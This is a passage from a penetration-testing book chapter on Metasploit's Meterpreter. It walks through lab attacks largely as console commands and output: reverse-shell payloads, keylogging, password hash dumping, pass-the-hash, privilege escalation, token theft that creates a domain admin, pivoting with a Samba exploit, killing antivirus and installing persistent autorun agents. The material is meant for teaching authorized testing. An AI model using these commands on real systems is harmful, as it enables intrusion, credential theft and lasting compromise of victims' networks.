=> password123\nmsf exploit(mssql_payload) > exploit\n[*] Started reverse handler on 192.168.33.129:443\n[*] Command Stager progress - 2.78% done (1494/53679 bytes)\n[*] Command Stager progress - 5.57% done (2988/53679 bytes)\n[*] Command Stager progress - 8.35% done (4482/53679 bytes)\n. . . SNIP . . .\n[*] Command Stager progress - 97.32% done (52239/53679 bytes)\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1699)\nmeterpreter > (cid:90)\nAfter selecting the mssql_payload module and setting our payload to\nmeterpreter at (cid:89), all we need to do is set the standard options before starting\nour Meterpreter session. We’ve succeeded in opening a Meterpreter session\nat (cid:90) on the target machine.\nTo recap, in the attack described here, we used the mssql_ping module\nto guess the MS SQL sa password, which we discovered is password123. We\nthen leveraged the mssql_payload module to communicate with MS SQL and\nupload a Meterpreter shell through MS SQL, and the shell was presented to\nus, thereby completely compromising the system. Once the Meterpreter shell\nis presented, we know that the exploit was successful and we can continue\nwith post exploitation on this system.\nBasic Meterpreter Commands\nHaving successfully compromised the target and gained a Meterpreter console\non the system, we can glean more information with some basic Meterpreter\ncommands. Use the help command at any point for more information on\nhow to use Meterpreter.\nCapturing a Screenshot\nMeterpreter’s screenshot command will export an image of the active user’s\ndesktop and save it to the /opt/metasploit3/msf3/ directory, as shown in Figure 6-1.\nmeterpreter > screenshot\nScreenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg\nDesktop screen captures offer a great way to learn about a target system.\nFor example, in Figure 6-1, we can see that McAfee antivirus software is\ninstalled and running, which means we’ll need to be cautious about what we\nupload to the system. (Chapter 7 discusses antivirus evasion in more detail.)\n80 Chapter 6\nFigure 6-1: Meterpreter-captured screenshot\nsysinfo\nAnother command we can specify is sysinfo, which will tell us the platform on\nwhich the system is running, as shown here:\nmeterpreter > sysinfo\nComputer: IHAZSECURITY\nOS : Windows XP (Build 2600, Service Pack 2).\nArch : x86\nLanguage: en_US\nAs you can see, this system is running Windows XP Service Pack 2. Because\nSP2 is end of life, we can assume that we can find a ton of holes on this system.\nCapturing Keystrokes\nNow we’ll grab the password hash values from this system, which can either\nbe cracked or used in an attack. We’ll also start keystroke logging (recording\nkeystrokes) on the remote system. But first, let’s list the running processes on\nthe target system with the ps command.\nmeterpreter > ps (cid:88)\nProcess list\n============\nPID Name Arch Session User Path\n--- ---- ---- ------- ---- ----\n0 [System Process]\n4 System x86 0 NT AUTHORITY\\SYSTEM\n. . . SNIP . . .\nMeterpreter 81\n1476 spoolsv.exe x86 0 NT AUTHORITY\\SYSTEM C:\\WINDOWS\\\nsystem32\\spoolsv.exe\n1668 explorer.exe (cid:89) x86 0 IHAZSECURITY\\Administrator C:\\WINDOWS\\\nExplorer.EXE\n. . . SNIP . . .\n4032 notepad.exe x86 0 IHAZSECURITY\\Administrator C:\\WINDOWS\\\nsystem32\\notepad.exe\nmeterpreter > migrate 1668 (cid:90)\n[*] Migrating to 1668...\n[*] Migration completed successfully.\nmeterpreter > run post/windows/capture/keylog_recorder (cid:91)\n[*] Executing module against V-MAC-XP\n[*] Starting the keystroke sniffer...\n[*] Keystrokes being saved in to /root/.msf3/loot/\n20110324171334_default_192.168.1.195_host.windows.key_179703.txt\n[*] Recording keystrokes...\n[*] Saving last few keystrokes...\nroot@bt:~# cat /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt (cid:92)\nKeystroke log started at Thu Mar 24 17:13:34 -0600 2011\nadministrator password <Back> <Back> <Back> <Back> <Back> <Back> <Back> <Tab> password123!!\nExecuting ps at (cid:88) provides a list of running processes, including\nexplorer.exe (cid:89). At (cid:90) we issue the migrate command to move our session\nintothe explorer.exe process space. Once that move is complete, we start the\nkeylog_recorder module at (cid:91), stopping it after some time with CTRL-C, and\nfinally, at (cid:92), in another terminal window, we dump the contents of the\nkeystroke logger to see what we’ve caught.\nDumping Usernames and Passwords\nIn the preceding example, we grabbed password hashes by logging what a\nuser typed. We can also use Meterpreter to obtain the usernames and pass-\nword hashes on a local file system without the use of keyloggers.\nExtracting the Password Hashes\nIn this attack, we’ll leverage the hashdump post exploitation module in Meter-\npreter to extract the username and password hashes from the system. Microsoft\ntypically stores hashes on LAN Manager (LM), NT LAN Manager (NTLM),\nand NT LAN Manager v2 (NTLMv2).\nIn the case of LM, for example, when a use enters a password for the first\ntime or changes a password, the password is assigned a hash value. Depend-\ning on the hash value length, the password can be split into seven-character\nhashes. For example, if the password is password123456, the hash value could\nbe stored as passwor and d123456, so an attacker would simply need to crack\n82 Chapter 6\na 7-character password instead of a 14-character one. In NTLM, regardless\nof the password size, password123456 would be stored as a hash value of\npassword123456.\nNOTE We’re using a super complex password here that we would not be able to crack in a rea-\nsonable amount of time. Our password is larger than the 14-character maximum that\nLM supports, so it has automatically converted itself to an NTLM-based hash value.\nEven with rainbow tables or a super powerful cracking machine, it would take a signif-\nicant amount of time to crack these passwords.\nIn the following code, we extract a username and password hash for the\nAdministrator user account with UID 500 (the Windows Administrator system\ndefault). The strings that follow Administrator:500 are two hashes of the\nAdministrator password. This shows an example of a simple extract of a user-\nname and password hashes. Shortly, we will extract our own username and\npassword hashes from our Windows XP system.\nAdministrator:500:e52cac67419a9a22cbb699e2fdfcc59e (cid:88) :30ef086423f916deec378aac42c4ef0c (cid:89):::\nThe first hash at (cid:88) is an LM hash, and the second at (cid:89) is an NTLM hash.\nDumping the Password Hash\nOn your target machine, change your password to something complex, such\nas thisisacrazylongpassword&&!!@@## and use Meterpreter to dump the user-\nname and password hashes (shown in the preceding code listing) from the\ntarget again. We will leverage the use priv command, which means we are\nrunning as a privileged user account.\nTo dump the Security Account Manager (SAM) database, we need to be\nrunning as SYSTEM to get around the registry restrictions and dump the pro-\ntected SAM storage that contains our Windows usernames and passwords, as\nshown next. Try performing this scenario on a test virtual machine to see if\nyou can dump the username and password hashes. In this listing, we execute\nthe hashdump command, which dumps all the usernames and password hashes\nfrom the system.\nmeterpreter > use priv\nLoading extension priv...success.\nmeterpreter > run post/windows/gather/hashdump\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::\nA hash value that starts with aad3b435 is simply an empty or\nnullhashvalue—a placeholder for an empty string. (Something like\nAdministrator:500:NOPASSWD:ntlmhash is also null.) Because our password\nMeterpreter 83\nwas longer than 14 characters, Windows can no longer store an LM hash, and\nit uses the standard aad3b435 . . . string, which represents a blank password.\nTHE PROBLEM WITH LM HASHES\nJust for fun, try the following: Change your password to something complex that is\n14characters or less. Then extract the password hashes from the system with hashdump\nand copy the first hash value (such as the portion beginning with aad3b435 in the\npreceding example), which is the LM hash. Next, search for one of the many online\npassword crackers and submit your hash value. Wait a few minutes, click the refresh\nbutton a couple of times, and your password should be cracked. (Be careful not to use\none of your real passwords, because the information is frequently posted to everyone\nwho visits the site!)\nThis is a rainbow table attack. A rainbow table is a precomputed table used for\nreversing cryptographic hash functions, usually for cracking passwords. Rainbow\ntables use every combination of characters including 1–7, a–z, special symbols, and\nspaces. When you submit your hash to an online cracker, the site’s server searches\nthrough gigabytes of rainbow tables for your specific hash.\nPass the Hash\nIn the preceding example, we ran into a slight complication: We have the\nadministrator’s username and password hashes, but we can’t crack the pass-\nword in a reasonable time frame. If we don’t know the password, how can we\nlog into additional machines and potentially compromise more systems with\nthis one user account?\nWe can use the pass-the-hash technique, which requires that we have only\nthe password hash, not the password itself. Metasploit’s windows/smb/psexec\nmodule makes this all possible, as shown here:\nmsf> use windows/smb/psexec (cid:88)\nmsf exploit(psexec)> set PAYLOAD windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(psexec)> set LHOST 192.168.33.129\nLHOST => 192.168.33.129\nmsf exploit(psexec)> set LPORT 443\nLPORT => 443\nmsf exploit(psexec)> set RHOST 192.168.33.130\nRHOST => 192.168.33.130\n. . . SNIP . . .\nmsf exploit(psexec)> set SMBPass\naad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 (cid:89)\nSMBPass => aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29\nmsf exploit(psexec)> exploit\n[*] Connecting to the server...\n[*] Started reverse handler\n[*] Authenticating as user 'Administrator'...\n84 Chapter 6\n[*] Uploading payload...\n[*] Created \\JsOvAFLy.exe...\nAfter we select the smb/psexec module at (cid:88) and set the options for LHOST,\nLPORT, and RHOST, we set the SMBPass variable, and at (cid:89) we input the hash that\nwe dumped earlier. As you can see, authentication is successful and we gain\nour Meterpreter session. We didn’t have to crack a password, and no pass-\nword was needed. We’ve secured Administrator privileges using the password\nhash alone.\nWhen we successfully compromise one system on a large network, in\nmost cases that system will have the same administrator account on multiple\nsystems. This attack would allow us to hop from one system to another with-\nout ever needing to crack the password itself.\nPrivilege Escalation\nNow that we have access to the system, we can create a normal user account\nwith limited permissions using the net user command. We’ll create a new\nuser account to demonstrate how to elevate permissions as that user. (You\nwill learn more about this in Chapter 8.)\nWhen we compromise a limited user account, we will run into restric-\ntions that prevent us from executing commands that require administrative-\nlevel permissions. By elevating an account’s permissions, we overcome that\nrestriction.\nOn a Windows XP target machine, we enter the following command:\nC:\\Documents and Settings\\Administrator>net user bob password123 /add.\nNext, we create a Meterpreter-based payload, payload.exe, copy it to the\ntarget’s XP machine, and run it under the user account bob. This will be our\nnew limited user account. In this example, we will use msfpayload to create a\nMeterpreter-based payload as a normal Windows executable. (We’ll discuss\nmsfpayload in more detail in Chapter 7.)\nroot@bt:/opt/framework3/msf3# msfpayload windows/meterpreter/reverse_tcp\nLHOST=192.168.33.129 LPORT=443 X > payload.exe (cid:88)\nroot@bt:/opt/framework3/msf3# msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp\nLHOST=192.168.33.129 LPORT=443 E (cid:89)\n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 192.168.33.129:443\n[*] Starting the payload handler...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1056)\nmeterpreter > getuid (cid:90)\nServer username: IHAZSECURITY\\bob\nMeterpreter 85\nThe LHOST and LPORT options tell Metasploit that when it creates our\nMeterpreter payload it should connect back to our attacker machine on\nport 443. We then call the msfcli interface to start a listener handler for us.\nThis listener handler will wait for connections, and when one is received, it\nwill spawn a Meterpreter shell.\nOn the attacker machine, we create a new Meterpreter stand-alone exe-\ncutable at (cid:88), copy the executable to the Windows XP machine, and run it\nunder the user account bob.\nWe then set up a listener at (cid:89) to listen for the Meterpreter connection.\nAfter the target executes the payload on the system (payload.exe), we see a lim-\nited user Meterpreter console (cid:90). We can, for example, generate a payload.exe\non a Back|Track machine, copy the executable to a Windows XP machine, and\nset up a listener to get a Meterpreter session.\nAs shown in the next listing, we drop to a Meterpreter shell at (cid:88) and\nenter net user bob; we can see that user bob is a member of the Users group,\nisnot an administrator, and has limited rights. We have a limited footprint\nfrom which to attack this device, and we can’t perform certain attacks, such\nas dumping the SAM database to extract usernames and passwords. (Luckily,\nMeterpreter has us covered, as you’ll see in a moment.) Our query complete,\nwe press CTRL-Z, which saves our Meterpreter session and keeps us in the\nexploited system.\nmeterpreter > shell (cid:88)\nProcess 2896 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\>net user bob\n. . . SNIP . . .\nLocal Group Memberships *Users\nGlobal Group memberships *None\nThe command completed successfully.\nC:\\>^Z\nBackground channel 1? [y/N] y\nNOTE Here’s another Meterpreter trick: While you’re in the Meterpreter console, enter background\nto jump back into msfconsole and leave the session running. Then enter sessions -l\nand sessions -i sessionid to return to your Meterpreter console.\nNow let’s get administrative or SYSTEM rights. As shown in the next list-\ning, we enter use priv to load the priv extensions, which gets us access to the\nprivileged module (which may already be loaded). Next, we enter getsystem\nin an attempt to elevate our privilege to that of local system, or administra-\ntor. We then verify that we have admin privileges with the getuid command.\nThe server username returned is NT AUTHORITY\\SYSTEM, which tells us\nthat we’ve succeeded at gaining administrator access.\n86 Chapter 6\nmeterpreter > use priv\nLoading extension priv...success.\nmeterpreter > getsystem\n...got system (via technique 4).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nTo switch back to the previous user account where we initially got our\nMeterpreter shell, we’d use rev2self.\nToken Impersonation\nIn token impersonation, we grab a Kerberos token on the target’s machine and\nthen use it in place of authentication to assume the identity of the user that\noriginally created that token. Token impersonation is very beneficial for pen-\netration tests and can be one of Meterpreter’s most powerful features.\nConsider the following scenario, for example: You’re performing a pene-\ntration test at your organization, and you successfully compromise the system\nand establish a Meterpreter console. A domain administrator account has\nlogged on within the last 13 hours. When this account logs on, a Kerberos\ntoken is passed to the server (single sign-on) and is valid for a certain period\nof time. You exploit this system via the valid and active Kerberos token, and\nthrough Meterpreter you successfully assume the role of a domain adminis-\ntrator, without needing the password. Then you hack a domain administra-\ntor account or go after a domain controller. This is probably one of the\neasiest ways to gain access into a system and just another example of why\nMeterpreter is so useful.\nUsing ps\nFor this example, we’ll use the Meterpreter function ps to list the applications\nrunning and show under which account they are running. We’ll use the\ndomain name SNEAKS.IN (cid:88) and the user account ihazdomainadmin (cid:89).\nmeterpreter > ps\nProcess list\n============\nPID Name Arch Session User Path\n--- ---- ---- ------- ---- ----\n0 [System Process]\n4 System x86 0 NT AUTHORITY\\SYSTEM\n380 cmd.exe x86 0 (cid:88)SNEAKS.IN\\ihazdomainadmin(cid:89) \\System\\\nRoot\\System32\\cmd.exe\n. . . SNIP . . .\nmeterpreter >\nMeterpreter 87\nAs shown in the following listing, we leverage steal_token and the PID\n(380 in this case) to steal the token of that user and assume the role of the\ndomain administrator:\nmeterpreter > steal_token 380\nStolen token with username: SNEAKS.IN\\ihazdomainadmin\nmeterpreter >\nWe have successfully impersonated the domain administrator account\nand Meterpreter is now running under the context of that user.\nIn some cases, ps may not list a running process running as a domain\nadministrator. We can leverage incognito to list available tokens on the system\nas well. When performing a penetration test, we should check the output of\nboth ps and icognito because the results may vary.\nWe load incognito with use incognito and then list tokens with list_tokens -u.\nLooking through the list of tokens, we see the SNEAKS.IN\\ihazdomainadmin user\naccount at (cid:88). Now we can pretend to be someone else.\nmeterpreter > use incognito\nLoading extension incognito...success.\nmeterpreter > list_tokens -u\n[-] Warning: Not currently running as SYSTEM, not all tokens will be available\nCall rev2self if primary process token is SYSTEM\nDelegation Tokens Available\n========================================\nSNEAKS.IN\\ihazdomainadmin (cid:88)\nIHAZSECURITY\\Administrator\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nImpersonation Tokens Available\n========================================\nNT AUTHORITY\\ANONYMOUS LOGON\nAs shown in the next listing, we successfully impersonate the ihazdomainadmin\ntoken at (cid:88) and add a user account at (cid:89), which we then give domain admin-\nistrator rights at (cid:90). (Be sure to use two backslashes, \\\\, when entering the\nDOMAIN\\USERNAME at (cid:88).) Our domain controller is 192.168.33.50.\nmeterpreter > impersonate_token SNEAKS.IN\\\\ihazdomainadmin (cid:88)\n[+] Delegation token available\n[+] Successfully impersonated user SNEAKS.IN\\ihazdomainadmin\nmeterpreter > add_user omgcompromised p@55w0rd! -h 192.168.33.50 (cid:89)\n[*] Attempting to add user omgcompromised to host 192.168.33.50\n[+] Successfully added user\nmeterpreter > add_group_user \"Domain Admins\" omgcompromised -h 192.168.33.50 (cid:90)\n[*] Attempting to add user omgcompromised to group Domain Admins on domain controller\n192.168.33.50\n[+] Successfully added user to group\n88 Chapter 6\nWhen entering the add_user and add_group_user commands, be sure to\nspecify the -h flag, which tells Incognito where to add the domain administra-\ntor account. In this case, that would be the IP address of a domain controller.\nThe implications for this attack are devastating: Essentially, the Kerberos\ntoken on any system that a domain administrator logs into can be assumed\nand used to access the entire domain. This means that every server on your\nnetwork is your weakest link!\nPivoting onto Other Systems\nPivoting is a Meterpreter method that allows for the attack of other systems\non a network through the Meterpreter console. For example, if an attacker\nwere to compromise one system, he could use pivoting to compromise other\nsystems on the same network or to access systems to which he could not\notherwise route traffic, for whatever reason.\nFor example, suppose you’re performing a penetration test from\ntheInternet. You compromise a system through a vulnerability and have a\nMeterpreter console to the internal network. You can’t directly access other\nsystems on the network, because the system you compromised did not pro-\nvide you with everything you need to do so, but you need to penetrate the\nnetwork further. Pivoting will allow you to attack multiple systems on the\ninternal network through the Internet, using the Meterpreter console.\nIn the following example, we’ll attack a system from one subnet and route\nthat system to attack another system. First, we’ll exploit the Windows XP\nmachine, and then we’ll piggyback the attack from our attacking machine to\nan Ubuntu system on the internal network. We’ll come from a 10.10.1.1/24\naddress and attack systems within the 192.168.33.1/24 network.\nWe’ll assume that we already have access to one server via a compromise\nand will focus on establishing a connection to that network. Next, we intro-\nduce external scripts written with Meterpreter that can be found in the scripts/\nmeterpreter/ directory. These scripts offer additional functionality that we can\nuse within Meterpreter.\nWe begin by displaying local subnets on the compromised system within\na Meterpreter session with run get_local_subnets, as shown at (cid:88).\n[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1075)\nmeterpreter > run get_local_subnets (cid:88)\nLocal subnet: 192.168.33.0/255.255.255.0\nmeterpreter > background (cid:89)\nmsf exploit(handler) > route add 192.168.33.0 255.255.255.0 1 (cid:90)\nmsf exploit(handler) > route print (cid:91)\nActive Routing Table\n====================\nSubnet Netmask Gateway\n------ ------- -------\n192.168.33.0 255.255.255.0 Session 1 (cid:92)\nMeterpreter 89\nWe have successfully compromised our Windows XP machine and have\nfull access to it. Next, we background our running session at (cid:89) and add a\nroute command to the Framework at (cid:90), telling it to route the remote net-\nwork ID over session 1, the background Meterpreter session. We then display\nactive routes with route print at (cid:91), and we can clearly see at (cid:92) that, just as we\ndesired, the route is active.\nNext, we’ll set up a second exploit against the targeted Linux system.\nThe specific exploit here is a Samba-based heap overflow, which would be\nvulnerable on our Metasploitable machine.\nuse msf exploit(handler) > use linux/samba/lsa_transnames_heap\nmsf exploit(lsa_transnames_heap) > set payload linux/x86/shell/reverse_tcp\npayload => linux/x86/shell/reverse_tcp\nmsf exploit(lsa_transnames_heap) > set LHOST 10.10.1.129 (cid:88)\nLHOST => 10.10.1.129\nmsf exploit(lsa_transnames_heap) > set LPORT 8080\nLPORT => 8080\nmsf exploit(lsa_transnames_heap) > set RHOST 192.168.33.132 (cid:89)\nRHOST => 192.168.33.132\nmsf exploit(lsa_transnames_heap) > ifconfig (cid:90)\n[*] exec: ifconfig\neth0 Link encap:Ethernet HWaddr 00:0c:29:47:e6:79\ninet addr:10.10.1.129 Bcast:10.10.1.255 Mask:255.255.255.0\ninet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nRX packets:23656 errors:0 dropped:0 overruns:0 frame:0\nTX packets:32321 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:4272582 (4.2 MB) TX bytes:17849775 (17.8 MB)\nInterrupt:19 Base address:0x2000\nlo Link encap:Local Loopback\ninet addr:127.0.0.1 Mask:255.0.0.0\ninet6 addr: ::1/128 Scope:Host\nUP LOOPBACK RUNNING MTU:16436 Metric:1\nRX packets:600 errors:0 dropped:0 overruns:0 frame:0\nTX packets:600 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:0\nRX bytes:41386 (41.3 KB) TX bytes:41386 (41.3 KB)\nmsf exploit(lsa_transnames_heap) > exploit\n[*] Started reverse handler on 10.10.1.129:8080\n[*] Creating nop sled....\n[*] Trying to exploit Samba with address 0xffffe410...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n90 Chapter 6\n[+] Server did not respond, this is expected\n[*] Trying to exploit Samba with address 0xffffe411...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n[+] Server did not respond, this is expected\n[*] Trying to exploit Samba with address 0xffffe412...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n[*] Sending stage (36 bytes)\n[*] Command shell session 1 opened (10.10.1.129:8080 -> 192.168.33.132:1608) (cid:91)\nCompare the LHOST (cid:88) and RHOST (cid:89) variables to the network information\ndisplayed by ifconfig (cid:90). Our LHOST option specifies the IP address of our attack-\ning machine. Also notice, the RHOST option IP address is set to a different net-\nwork subnet and that we are attacking systems by tunneling our traffic through\nour compromised target to additional systems on the target’s network. We\nare leveraging the pivoting attack through Metasploit to pass communica-\ntions through our exploited machine to the target machine that resides on\nthe local subnet. In this case, if the heap overflow is successful, we should be\npresented with a reverse shell from 192.168.33.132, simply by leveraging the\nnetwork communications on the already compromised machine. When we run\nthe exploit with exploit, we see at (cid:91) that a connection is set up as expected\non a different machine, not the Windows XP machine. Now, to port scan\nthrough the pivot, we would use the scanner/portscan/tcp scanner module,\nwhich is built to handle routing through Metasploit.\nNOTE You could also use the scanner/portscan/tcp scanner to conduct a series of port\nscans through your compromised target on the local subnet itself. We won’t go into the\ndetails here, but just know that you can perform port scanning on a compromised net-\nwork leveraging this module.\nIn the preceding examples, we used the route add command after we had\ncompromised the system. Alternatively, to add the routes automatically to\nMeterpreter upon a new session spawn, we could use load auto_add_route:\nmsf exploit(ms08_067_netapi) > load auto_add_route\n[*] Successfully loaded plugin: auto_add_route\nmsf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 10.10.1.129:443\n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1090)\n[*] AutoAddRoute: Routing new subnet 192.168.33.0/255.255.255.0 through session 1\nMeterpreter 91\nUsing Meterpreter Scripts\nSeveral external Meterpreter scripts can help you to enumerate a system or\nperform predefined tasks inside the Meterpreter shell. We won’t cover every\nscript here, but we will mention a few of the most notable ones.\nNOTE The Meterpreter scripts are in the process of being moved to post exploitation modules.\nWe’ll cover both scripts and post exploitation modules in this chapter.\nTo run a script from the Meterpreter console, enter run scriptname. The\nscript will either execute or provide additional help on how to run it.\nShould you want to use an interactive remote GUI on the system, you\ncan use the VNC protocol to tunnel the active desktop communications\nand interact with the GUI desktop on the target machine. But in some\ncases, the system may be locked and you may be unable to access it. Never\nfear: Metasploit has us covered.\nIn the following example, we issue the run vnc command, which installs a\nVNC session on the remote system. From there, we launch run screen_unlock\nto unlock the target machine so that we can view the desktop. As a result, a\nVNC window should appear, showing us the target desktop.\nmeterpreter > run vnc\n[*] Creating a VNC reverse tcp stager: LHOST=192.168.33.129 LPORT=4545)\n[*] Running payload handler\n[*] VNC stager executable 37888 bytes long\n[*] Uploaded the VNC agent to C:\\WINDOWS\\TEMP\\CTDWtQC.exe (must be deleted manually)\n[*] Executing the VNC agent with endpoint 192.168.33.129:4545...\n[*] VNC Server session 2 opened (192.168.33.129:4545 -> 192.168.33.130:1091)\nThis will give us a VNC graphical interface to the target machine and\nallow us to interact through a desktop.\nmeterpreter > run screen_unlock\n[*] OS 'Windows XP (Build 2600, Service Pack 2).' found in known targets\n[*] patching...\n[*] done!\nMigrating a Process\nOften, when we are attacking a system and exploiting a service such as Inter-\nnet Explorer, if the target user closes the browser, the Meterpreter session\nisalso closed and we lose our connection to the target. To avoid this prob-\nlem, we can use the migrate post exploitation module, shown next, to attempt\nto migrate the service to a memory space that won’t close when the target\ncloses the browser. By migrating to a different, more stable process, we ensure\nthat the process isn’t closed and we maintain our connection to the system.\nmeterpreter > run post/windows/manage/migrate\n[*] Running module against V-MAC-XP\n[*] Current server process: revterp.exe (2436)\n92 Chapter 6\n[*] Migrating to explorer.exe...\n[*] Migrating into process ID 816\n[*] New server process: Explorer.EXE (816)\nKilling Antivirus Software\nAntivirus software can block certain tasks. During penetration tests, we have\nseen “smarter” antivirus or host-based intrusion prevention products block\nour ability to run certain attack vectors. In such cases, we can run the killav\nscript to stop the processes preventing our tasks from running.\nmeterpreter > run killav\n[*] Killing Antivirus services on the target...\n[*] Killing off cmd.exe...\n[*] Killing off cmd.exe...\nObtaining System Password Hashes\nObtaining a copy of the system’s password hashes allows us to run pass-the-\nhash attacks or to brute force the hash to reveal the plain-text password. We\ncan obtain the password hashes with the run hashdump command:\nmeterpreter > run hashdump\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nViewing All Traffic on a Target Machine\nTo see all traffic on a target, we can run a packet recorder. Everything cap-\ntured by packetrecorder is saved in the .pcap file format to be parsed with a\ntool such as Wireshark.\nIn this listing, we run the packetrecorder script with the -i 1 option, which\nspecifies which interface we want to use to perform the packet captures:\nmeterpreter > run packetrecorder -i 1\n[*] Starting Packet capture on interface 1\n[*] Packet capture started\nScraping a System\nThe scraper script enumerates just about everything you could ever want\nfrom a system. It will grab the usernames and passwords, download the entire\nregistry, dump password hashes, gather system information, and export the\nHKEY_CURRENT_USER (HKCU).\nMeterpreter 93\nmeterpreter > run scraper\n[*] New session on 192.168.33.130:1095...\n[*] Gathering basic system information...\n[*] Dumping password hashes...\n[*] Obtaining the entire registry...\n[*] Exporting HKCU\n[*] Downloading HKCU (C:\\WINDOWS\\TEMP\\XklepHOU.reg)\nUsing Persistence\nMeterpreter’s persistence script allows you to inject a Meterpreter agent to\nensure that Meterpreter is running even after the target system reboots. If\nthis is a reverse connection, you can set intervals for the target to connect\nback to the attacker machine. If it’s a bind, you can have it attempt to bind\non an interface at a given time.\nWARNING If you use this functionality, be sure that you remove it after you’re done. If you forget to\ndo this, any attacker can also gain access to the system without authentication!\nIn the following listing, we run persistence and tell Windows to autostart\nthe agent at boot time (-X), wait 50 seconds (-i 50) before connection retries,\nrun on port 443 (-p 443), and connect to IP 192.168.33.129. We then estab-\nlish a listener for the agent at (cid:88) with use multi/handler, and after setting a\ncouple of options and running exploit, we see at (cid:90) that the connection comes\nin as expected.\nmeterpreter > run persistence -X -i 50 -p 443 -r 192.168.33.129\n[*] Creating a persistent agent: LHOST=192.168.33.129 LPORT=443 (interval=50 onboot=true)\n[*] Persistent agent script is 316384 bytes long\n[*] Uploaded the persistent agent to C:\\WINDOWS\\TEMP\\asSnqrlUDRwO.vbs\n[*] Agent executed with PID 3160\n[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xEYnaHedooc (cid:89)\n[*] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\nxEYnaHedooc\nmsf> use multi/handler (cid:88)\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LPORT 443\nLPORT => 443\nmsf exploit(handler) > set LHOST 192.168.33.129\nLHOST => 192.168.33.129\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.33.129:443\n[*] Starting the payload handler...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 2 opened (192.168.33.129:443 -> 192.168.33.130:1120) (cid:90)\n94 Chapter 6\nAs of this writing, the only way to remove the Meterpreter agent is to\ndelete the registry entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\\nRun\\ and remove the VBScript located in C:\\WINDOWS\\TEMP\\. Be sure to\ndocument the registry keys and locations (such as HKLM\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run\\xEYnaHedooc (cid:89)) to remove them manually. Gen-\nerally, you can do this through Meterpreter or drop to a shell and remove it\nthat way. If you feel more comfortable using a GUI, you can use run vnc and\nremove the script with regedit. (Note that the registry keys will change each time,\nso make sure that you document where Metasploit adds the registry keys.)\nLeveraging Post Exploitation Modules\nAs mentioned earlier, the Meterpreter scripts are slowly being converted to\npost exploitation modules. The move to post exploitation modules will finally\ngive a fully consistent standard and format to the Metasploit modules. As you\nread through later chapters, you’ll see the overall structure of auxiliary mod-\nules and exploits. In the past, Meterpreter scripts used their own format,\nwhich was very different from the way other modules behaved.\nOne added benefit of moving the modules to the same format is the ability\nto perform the same attack on all sessions available. Suppose, for example,\nthat you have 10 open Meterpreter shells. In the traditional fashion, you\nwould need to run hashdump on each or write custom scripts to query through\neach console. In the new format, you would be able to interact with each\nsession and perform the hashdump on multiple systems if needed.\nThe next listing shows an example of how to use the post exploitation\nmodules:\nmeterpreter > run post/windows/gather/hashdump\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\nTo see a list of post exploitation modules, enter the following and then\npress the TAB key on your keyboard at the end of the line:\nmeterpreter > run post/\nUpgrading Your Command Shell to Meterpreter\nOne of the newer features in the Metasploit Framework is its ability 